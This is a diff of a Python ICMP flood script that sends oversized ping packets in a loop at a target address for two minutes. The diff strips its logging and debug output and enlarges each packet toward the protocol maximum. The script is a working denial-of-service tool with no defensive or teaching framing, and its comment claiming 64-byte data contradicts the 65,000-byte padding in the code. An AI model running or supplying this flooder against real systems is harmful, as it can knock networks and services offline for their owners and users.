@@ -1,8 +1,8 @@
 import socket
+import random
 import struct
 import sys
 import time
-import logging
 
 def icmp_flood(target_ip, duration):
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
@@ -11,16 +11,13 @@ def icmp_flood(target_ip, duration):
     while time.time() < timeout:
         packet = create_icmp_packet()
         sock.sendto(packet, (target_ip, 0))
-        logging.info(f"ICMP request sent to {target_ip}")
 
 def create_icmp_packet():
     # Установим длину данных в точно 64 байта
-    data = b'ABCDEFGHIJKLMNOPQRSTUVWX' + b'\x00' * 64500
+    data = b'ABCDEFGHIJKLMNOPQRSTUVWX' + b'\x00' * 65000
     header = struct.pack('!BBHHH', 8, 0, 0, 100, 1)
-    print(header)
     cksum = calculate_checksum(header + data)
     header = struct.pack('!BBHHH', 8, 0, cksum, 100, 1)
-    print(len(header+data))
     return header + data
 
 def calculate_checksum(data):
@@ -47,5 +44,4 @@ def calculate_checksum(data):
 if __name__ == '__main__':
     target_ip = '192.168.1.1'
     duration = 120
-    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
     icmp_flood(target_ip, duration)
